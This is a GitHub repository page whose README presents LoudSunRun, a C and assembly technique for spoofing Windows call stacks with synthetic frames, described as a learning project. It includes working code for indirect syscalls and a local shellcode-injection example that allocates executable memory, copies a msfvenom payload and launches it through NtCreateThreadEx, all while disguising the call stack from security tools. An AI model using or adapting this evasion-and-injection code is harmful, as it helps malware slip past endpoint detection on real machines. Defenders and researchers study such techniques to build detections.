# https://github.com/susMdT/LoudSunRun

[Skip to content](https://github.com/susMdT/LoudSunRun#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/susMdT/LoudSunRun) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/susMdT/LoudSunRun) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/susMdT/LoudSunRun) to refresh your session.Dismiss alert

{{ message }}

[susMdT](https://github.com/susMdT)/ **[LoudSunRun](https://github.com/susMdT/LoudSunRun)** Public

- [Notifications](https://github.com/login?return_to=%2FsusMdT%2FLoudSunRun) You must be signed in to change notification settings
- [Fork\\
42](https://github.com/login?return_to=%2FsusMdT%2FLoudSunRun)
- [Star\\
254](https://github.com/login?return_to=%2FsusMdT%2FLoudSunRun)


Stack Spoofing with Synthetic frames based on the work of namazso, SilentMoonWalk, and VulcanRaven


[254\\
stars](https://github.com/susMdT/LoudSunRun/stargazers) [42\\
forks](https://github.com/susMdT/LoudSunRun/forks) [Branches](https://github.com/susMdT/LoudSunRun/branches) [Tags](https://github.com/susMdT/LoudSunRun/tags) [Activity](https://github.com/susMdT/LoudSunRun/activity)

[Star](https://github.com/login?return_to=%2FsusMdT%2FLoudSunRun)

[Notifications](https://github.com/login?return_to=%2FsusMdT%2FLoudSunRun) You must be signed in to change notification settings

# susMdT/LoudSunRun

main

[**1** Branch](https://github.com/susMdT/LoudSunRun/branches) [**0** Tags](https://github.com/susMdT/LoudSunRun/tags)

[Go to Branches page](https://github.com/susMdT/LoudSunRun/branches)[Go to Tags page](https://github.com/susMdT/LoudSunRun/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![susMdT](https://avatars.githubusercontent.com/u/68256613?v=4&size=40)](https://github.com/susMdT)[susMdT](https://github.com/susMdT/LoudSunRun/commits?author=susMdT)<br>[fix README](https://github.com/susMdT/LoudSunRun/commit/e7d9f5ab780d115731b8105dd38ccfb184d4fcf1)<br>2 years agoOct 16, 2024<br>[e7d9f5a](https://github.com/susMdT/LoudSunRun/commit/e7d9f5ab780d115731b8105dd38ccfb184d4fcf1) · 2 years agoOct 16, 2024<br>## History<br>[16 Commits](https://github.com/susMdT/LoudSunRun/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/susMdT/LoudSunRun/commits/main/) 16 Commits |
| [Macros.h](https://github.com/susMdT/LoudSunRun/blob/main/Macros.h "Macros.h") | [Macros.h](https://github.com/susMdT/LoudSunRun/blob/main/Macros.h "Macros.h") | [Add files via upload](https://github.com/susMdT/LoudSunRun/commit/05a9b8899b3329a994aed5abc04285304fbfa0c7 "Add files via upload") | 3 years agoJun 16, 2023 |
| [README.md](https://github.com/susMdT/LoudSunRun/blob/main/README.md "README.md") | [README.md](https://github.com/susMdT/LoudSunRun/blob/main/README.md "README.md") | [fix README](https://github.com/susMdT/LoudSunRun/commit/e7d9f5ab780d115731b8105dd38ccfb184d4fcf1 "fix README") | 2 years agoOct 16, 2024 |
| [Structs.h](https://github.com/susMdT/LoudSunRun/blob/main/Structs.h "Structs.h") | [Structs.h](https://github.com/susMdT/LoudSunRun/blob/main/Structs.h "Structs.h") | [Update Structs.h](https://github.com/susMdT/LoudSunRun/commit/572494e112122af6e1be182e17566fba7e4f3741 "Update Structs.h") | 3 years agoJun 17, 2023 |
| [Testing.c](https://github.com/susMdT/LoudSunRun/blob/main/Testing.c "Testing.c") | [Testing.c](https://github.com/susMdT/LoudSunRun/blob/main/Testing.c "Testing.c") | [Update Testing.c](https://github.com/susMdT/LoudSunRun/commit/d51557a17c8221985bb67f7a5404cd6a9bcac9c3 "Update Testing.c") | 3 years agoJun 16, 2023 |
| [test.asm](https://github.com/susMdT/LoudSunRun/blob/main/test.asm "test.asm") | [test.asm](https://github.com/susMdT/LoudSunRun/blob/main/test.asm "test.asm") | [fixed r12 incident](https://github.com/susMdT/LoudSunRun/commit/7f3940700bc61e761bbebc541805fdbd94574bd3 "fixed r12 incident") | 3 years agoSep 17, 2023 |
| View all files |

## Repository files navigation

# LoudSunRun

[Permalink: LoudSunRun](https://github.com/susMdT/LoudSunRun#loudsunrun)

Stack Spoofing with Synthetic frames based on the work of namazso, SilentMoonWalk, and VulcanRaven

## Why?

[Permalink: Why?](https://github.com/susMdT/LoudSunRun#why)

Learning purposes

## Overview

[Permalink: Overview](https://github.com/susMdT/LoudSunRun#overview)

There are a few steps this program does

1. Allocate args on stack
2. Generate fake frames
3. Prep syscall
4. Spoof the return address
5. Make the call

To perform these, a param struct is passed as arg 5 and the number of stack args is passed on arg 6. The param struct contains the following:

- address of the `jmp rbx` gadget
- the original return address (for the Spoof function to return to)
- the stack sizes of our fake frames and gadget
- the address we want our fake frames to show on the call stack
- a SSN for syscalls (if included/ommited for non indirect syscalls, it does not affect anything)

The total stack size of the fake frames is calculated and the stack args are moved accordingly. A 0 is pushed onto the stack. This cuts off the stack walk.

Frames are then added, but in reverse order of appearence on the stack. They are planted like so

1. Decrement stack pointer by the frame's size
2. Place the return address at the stack pointer

Then, the param struct is modified to "save" some information. The `fixup` function is loaded into the rbx, so when the function returns (to a `jmp rbx` gadget), it will land into `fixup`. Fixup then undoes all the funky stack pointer movement, restores the rbx, and jumps back to the OG return address.

## Implementation

[Permalink: Implementation](https://github.com/susMdT/LoudSunRun#implementation)

A function can be called like so

```
Spoof(arg1, arg2, arg3, arg4, &param, function, (PVOID)0);
```

Param is a struct containing some necessary information for the call to have fake frames added.

The 6th argument is a pointer to the function to execute

The 7th argument specifies the number of args to pass to the stack. It has to be at an 8 byte size.

Example of calling NtAllocateVirtualMemory with the indirect syscall method

```
/////////////////////////////
// Initialize param struct //
/////////////////////////////
PVOID ReturnAddress = NULL;
PRM p = { 0 };
NTSTATUS status = STATUS_SUCCESS;

// just find a JMP RBX gadget. Can look anywhere. I chose k32
p.trampoline = FindGadget((LPBYTE)GetModuleHandle(L"kernel32.dll"), 0x200000);
printf("[+] Gadget is at 0x%llx\n", p.trampoline);

// You should probably walk the export table, but this is quick and easy.
ReturnAddress = (PBYTE)(GetProcAddress(LoadLibraryA("kernel32.dll"), "BaseThreadInitThunk")) + 0x14;
p.BTIT_ss = CalculateFunctionStackSizeWrapper(ReturnAddress);
p.BTIT_retaddr = ReturnAddress;

ReturnAddress = (PBYTE)(GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlUserThreadStart")) + 0x21;
p.RUTS_ss = CalculateFunctionStackSizeWrapper(ReturnAddress);
p.RUTS_retaddr = ReturnAddress;

p.Gadget_ss = CalculateFunctionStackSizeWrapper(p.trampoline);

// Hard coded for my machine, theoretically you do FreshyCalls or something
p.ssn = 0x18;

/////////////////////////////
// Initialize Syscall Args //
/////////////////////////////

PVOID alloc = NULL;
SIZE_T size = 1024;

///////////////////////////
// Call with fake frames //
///////////////////////////

Spoof((PVOID)(-1), &alloc, NULL, &size, &p, pNtAllocateVirtualMemory, (PVOID)2, (PVOID)(MEM_COMMIT | MEM_RESERVE), (PVOID)PAGE_EXECUTE_READWRITE);
```

If your machine works like mine, it will look like this

[![Call Stack](https://camo.githubusercontent.com/b1ce7db7083dde3a6a6649bf60a349514317954d835960b6793c2bc10ca027b1/68747470733a2f2f692e696d6775722e636f6d2f6148576e5834532e706e67)](https://camo.githubusercontent.com/b1ce7db7083dde3a6a6649bf60a349514317954d835960b6793c2bc10ca027b1/68747470733a2f2f692e696d6775722e636f6d2f6148576e5834532e706e67)

Example calling calc

```
unsigned char buf[] = //msfvenom brrr

PVOID alloc = NULL;
SIZE_T size = 1024;

PVOID pNtAllocateVirtualMemory = (PBYTE)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory")) + 0x12;
PVOID pMemcpy = GetProcAddress(LoadLibraryA("msvcrt.dll"), "memcpy");
PVOID pNtCreateThreadEx = (PBYTE)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx")) + 0x12;

p.ssn = 0x18;
Spoof((PVOID)(-1), &alloc, NULL, &size, &p, pNtAllocateVirtualMemory, (PVOID)2, (PVOID)(MEM_COMMIT | MEM_RESERVE), (PVOID)PAGE_EXECUTE_READWRITE);
Spoof(alloc, buf, (PVOID)276, NULL, &p, pMemcpy, (PVOID)0);
p.ssn = 0xc2;
PVOID hThread = NULL;
Spoof(&hThread, (PVOID)THREAD_ALL_ACCESS, NULL, (PVOID)(-1), &p, pNtCreateThreadEx, (PVOID)7, alloc, NULL, NULL, NULL, NULL, NULL, NULL);
Spoof((PVOID)INFINITE, NULL, NULL, NULL, &p, Sleep, (PVOID)0);
```

## Concerns

[Permalink: Concerns](https://github.com/susMdT/LoudSunRun#concerns)

I have not done extensive testing with this. I only called a few functions and tried a local shellcode injection. There could be some edge cases I haven't tested.

Please reach out to me for any comments and such. Godspeed.

## Credits

[Permalink: Credits](https://github.com/susMdT/LoudSunRun#credits)

5pider - Gadget Finder code

namazso - Return Address Spoofing

klezvirus, waldoirc, trickster0 - SilentMoonWalk (for Frame funky things)

william-burgess - Vulcan Raven (for finding stack wrapper)

## About

Stack Spoofing with Synthetic frames based on the work of namazso, SilentMoonWalk, and VulcanRaven


### Resources

[Readme](https://github.com/susMdT/LoudSunRun#readme-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/susMdT/LoudSunRun).

[Activity](https://github.com/susMdT/LoudSunRun/activity)

### Stars

[**254**\\
stars](https://github.com/susMdT/LoudSunRun/stargazers)

### Watchers

[**5**\\
watching](https://github.com/susMdT/LoudSunRun/watchers)

### Forks

[**42**\\
forks](https://github.com/susMdT/LoudSunRun/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FsusMdT%2FLoudSunRun&report=susMdT+%28user%29)

## [Releases](https://github.com/susMdT/LoudSunRun/releases)

No releases published

## [Packages\  0](https://github.com/users/susMdT/packages?repo_name=LoudSunRun)

No packages published

## Languages

- [C63.9%](https://github.com/susMdT/LoudSunRun/search?l=c)
- [Assembly36.1%](https://github.com/susMdT/LoudSunRun/search?l=assembly)

You can’t perform that action at this time.